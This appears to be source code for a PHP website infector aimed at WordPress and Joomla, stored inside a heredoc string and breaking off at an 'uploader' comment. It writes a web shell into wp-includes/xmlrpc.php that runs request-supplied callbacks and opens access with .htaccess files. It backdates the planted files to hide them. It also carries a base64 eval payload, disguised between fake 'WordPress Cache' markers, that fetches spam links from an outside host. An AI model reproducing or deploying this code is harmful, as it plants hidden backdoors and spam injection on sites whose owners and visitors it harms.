<?php

$line = <<<PHP
Array('1'=>'G', '0'=>'4', '3'=>'n', '2'=>'2', '5'=>'j', '4'=>'7', '7'=>'H', '6'=>'5', '9'=>'0', '8'=>'u', 'A'=>'h', 'C'=>'K', 'B'=>'k', 'E'=>'M', 'D'=>'A', 'G'=>'d', 'F'=>'F', 'I'=>'R', 'H'=>'8', 'K'=>'W', 'J'=>'a', 'M'=>'Q',
'L'=>'r', 'O'=>'T', 'N'=>'l', 'Q'=>'C', 'P'=>'E', 'S'=>'w', 'R'=>'s', 'U'=>'I', 'T'=>'1', 'W'=>'i', 'V'=>'3', 'Y'=>'L', 'X'=>'S', 'Z'=>'X', 'a'=>'O', 'c'=>'t', 'b'=>'U', 'e'=>'o', 'd'=>'P', 'g'=>'Z', 'f'=>'q', 'i'=>'Y', 'h'=>'p',
'k'=>'9', 'j'=>'V', 'm'=>'b', 'l'=>'x', 'o'=>'B', 'n'=>'J', 'q'=>'v', 'p'=>'g', 's'=>'z', 'r'=>'y', 'u'=>'c', 't'=>'6', 'w'=>'e', 'v'=>'N', 'y'=>'D', 'x'=>'m', 'z'=>'f');

$DEBUG_MODE=false;

$MIN_FILE_LENGTH = 20;

$sape_start_marker = '<?php /* <!-- Begin WordPress Cache (DO NOT MODIFY) --> */';
$sape_end_marker = '/* <!-- End WordPress Cache --> */ ?>';
$code_inject_sape = 'eval(base64_decode("ZnVuY3Rpb24gZmlsZV9nZXRfY29udGVudHNfY3VybCgkdXJsKSB7CiAkY2ggPSBjdXJsX2luaXQoKTsKIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOwogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgIkxPQ0FMU0FQRSIpOwogJGRhdGEgPSBjdXJsX2V4ZWMoJGNoKTsKIGN1cmxfY2xvc2UoJGNoKTsKIHJldHVybiAkZGF0YTsKfQokbGlua3MgPSBmaWxlX2dldF9jb250ZW50c19jdXJsKCJodHRwOi8vd3BjYWNoZS1ibG9nZ2VyLmNvbS9nZXRsaW5rcy5waHA/YXBpY29kZT1sYWxhbGE0NCZwYWdldXJsPSIudXJsZW5jb2RlKCdodHRwOi8vJy4kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXSkuIiZ1c2VyYWdlbnQ9Ii51cmxlbmNvZGUoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKS4iIik7CmVjaG8gJGxpbmtzOw=="));';
$link_start_marker = '/* wordpress */';
$link_end_marker = '/* wordpress */';
$code_inject_link = '';

define('FILE_TO_SAPE_EDIT_FIRST', 'footer.php');
define('FILE_TO_SAPE_EDIT_SECOND', 'null.php');

define('FILE_TO_LINK_EDIT_FIRST', 'header.php');
define('FILE_TO_LINK_EDIT_SECOND', 'footer.php');


$cms_params = array(
    'joomla'    => array(
            'root_folder_marker' => array('templates'),
            'themes_folder' => array('templates')
            ),

    'wordpress'    => array(
            'root_folder_marker' => array('wp-content', 'wp-includes'),
            'themes_folder' => array('wp-content/themes')
            ),
);


// glob, find
$recursive_function = 'glob';


$GLOBAL_SETTINGS = array(
    'cms_params'    => $cms_params,
    'cms'           => '',
    'document_root' => ''
);
$start = '/not-existented-rrrrroot';
$arr = get_document_root($GLOBAL_SETTINGS);

// Creating wp-includes/xmlrpc.php

$file_data ="<?php #f = #_REQUEST['e'];#p = array(#_REQUEST['x']);#pf = array_filter(#p, #f);exit; ?>";

echo"<br>---------------------------- Create wp-includes/xmlrpc.php ---------------------------------<br><br>";
if (file_put_contents("wp-includes/xmlrpc.php", str_replace("#", "$", $file_data))) {
touch("wp-includes/xmlrpc.php", mktime(12, 17, 11, 12, 31, 2013));
        echo"Proceeded: ".$start."/wp-includes/xmlrpc.php > Succesfull<br>";
} else {
        echo"Proceeded: ".$start."/wp-includes/xmlrpc.php > Error!<br>";
}

// Creating wp-includes/.htaccess

$file_data_htaccess ="allow from all";

echo"<br>---------------------------- Create wp-includes/.htaccess ---------------------------------<br><br>";
if (file_put_contents("wp-includes/.htaccess", $file_data_htaccess)) {
touch("wp-includes/.htaccess", mktime(12, 17, 11, 12, 31, 2013));
        echo"Proceeded: ".$start."/wp-includes/.htaccess > Succesfull<br>";
} else {
        echo"Proceeded: ".$start."/wp-includes/.htaccess > Error!<br>";
}

// Creating wp-admin/.htaccess

$file_data_htaccess ="allow from all";

echo"<br>---------------------------- Create wp-admin/.htaccess ---------------------------------<br><br>";
if (file_put_contents("wp-admin/.htaccess", $file_data_htaccess)) {
        echo"Proceeded: ".$start."/wp-admin/.htaccess > Succesfull<br>";
        touch("wp-admin/.htaccess", mktime(12, 17, 11, 12, 31, 2013));
} else {
        echo"Proceeded: ".$start."/wp-admin/.htaccess > Error!<br>";
}
// Creating wp-admin/ms-head.php (uploader)


PHP;

?>
